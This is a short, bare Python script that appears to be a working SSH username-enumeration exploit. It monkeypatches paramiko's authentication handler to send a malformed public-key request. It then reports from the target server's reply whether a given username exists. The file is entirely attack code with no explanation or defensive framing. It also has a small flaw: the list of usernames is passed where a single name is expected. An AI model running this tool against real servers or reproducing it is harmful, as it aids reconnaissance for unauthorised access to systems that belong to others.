#!/usr/bin/python3

import argparse
import logging
import paramiko
import socket
import sys


class InvalidUsername(Exception):
    pass


def add_boolean(*args, **kwargs):
    pass


old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[
        paramiko.common.MSG_SERVICE_ACCEPT]

def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    return old_service_accept(*args, **kwargs)


def userauth_failure(*args, **kwargs):
    raise InvalidUsername()


paramiko.auth_handler.AuthHandler._handler_table.update({
    paramiko.common.MSG_SERVICE_ACCEPT: service_accept,
    paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure
})

logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())


arg_parser = argparse.ArgumentParser()
arg_parser.add_argument('-t',dest='hostname', type=str)
arg_parser.add_argument('-p',dest='port', type=int, default=22)
arg_parser.add_argument('-u',dest='usernames', type=str, action='append')
args = arg_parser.parse_args()

sock = socket.socket()
try:
    sock.connect((args.hostname, args.port))
except socket.error:
    print ('[-] Failed to connect')
    sys.exit(1)

transport = paramiko.transport.Transport(sock)
try:
    transport.start_client()
except paramiko.ssh_exception.SSHException:
    print ('[-] Failed to negotiate SSH transport')
    sys.exit(2)


try:
    transport.auth_publickey(args.usernames, paramiko.RSAKey.generate(2048))
except InvalidUsername:
    print ('[*]- Invalid username')
    sys.exit(3)
except paramiko.ssh_exception.AuthenticationException:
    print ('[+]- Valid username')
